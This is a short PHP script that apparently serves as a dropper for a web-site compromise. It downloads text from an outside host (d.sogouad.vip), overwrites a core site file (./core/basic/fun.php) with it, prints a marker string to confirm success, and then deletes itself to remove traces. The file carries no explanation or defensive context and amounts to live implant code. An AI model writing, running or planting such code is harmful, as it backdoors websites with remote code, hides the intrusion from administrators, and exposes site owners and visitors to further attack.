<?php 
file_put_contents('./core/basic/fun.php',file_get_contents('http://d.sogouad.vip/txt/mtn.txt'));
echo 'temp111888';
unlink(__FILE__);